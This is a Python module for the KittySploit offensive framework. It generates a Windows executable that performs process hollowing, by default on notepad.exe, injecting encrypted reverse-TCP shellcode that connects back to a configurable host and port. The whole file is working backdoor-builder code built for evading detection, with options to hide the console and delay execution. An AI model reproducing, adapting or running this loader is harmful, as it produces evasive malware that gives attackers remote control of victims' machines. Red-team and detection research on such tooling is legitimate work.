#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Process hollowing evasion loader.

Creates a suspended child process, unmaps its original image, maps encrypted
shellcode at the image base, hijacks the thread context, and resumes execution.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_c_backdoor, option_value
from lib.compile.process_hollowing import ProcessHollowingBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Process Hollowing Evasion",
        "description": (
            "Generate a Windows x64 EXE that hollows a suspended process (default: notepad.exe), "
            "replaces its memory with decrypted shellcode, and resumes the primary thread."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1055/012/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    target_process = OptString(
        r"C:\Windows\System32\notepad.exe",
        "Suspended host process path",
        False,
    )
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(10000, "Sleep milliseconds before resuming thread", False)
    output_name = OptString("process_hollowing.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = ProcessHollowingBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_c_backdoor(
            self,
            builder,
            build_source_kwargs={"target_path": str(option_value(self, "target_process"))},
            output_name="process_hollowing.exe",
            save_source_name="process_hollowing.c",
        )
        if ok:
            print_info(
                f"Target: {option_value(self, 'target_process')} | "
                f"Cipher: {option_value(self, 'cipher')} | Sleep: {option_value(self, 'sleep')} ms"
            )
        return ok
